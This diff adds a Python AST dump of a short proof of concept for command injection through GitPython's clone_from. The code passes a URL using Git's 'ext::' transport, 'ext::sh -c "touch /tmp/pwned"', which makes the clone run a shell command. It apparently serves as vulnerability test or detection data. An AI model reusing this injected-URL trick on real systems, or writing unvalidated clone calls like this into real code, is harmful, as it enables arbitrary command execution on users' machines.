@@ -1,0 +1,53 @@
+Module(
+    body=[
+        ImportFrom(
+            module='git',
+            names=[
+                alias(name='Repo')],
+            level=0),
+        FunctionDef(
+            name='clone_repository',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='malicious_url')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='r', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='Repo', ctx=Load()),
+                            attr='init',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='')],
+                        keywords=[
+                            keyword(
+                                arg='bare',
+                                value=Constant(value=True))])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='r', ctx=Load()),
+                            attr='clone_from',
+                            ctx=Load()),
+                        args=[
+                            Name(id='malicious_url', ctx=Load()),
+                            Constant(value='tmp')],
+                        keywords=[]))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='malicious_url', ctx=Store())],
+            value=Constant(value='ext::sh -c "touch /tmp/pwned"')),
+        Expr(
+            value=Call(
+                func=Name(id='clone_repository', ctx=Load()),
+                args=[
+                    Name(id='malicious_url', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
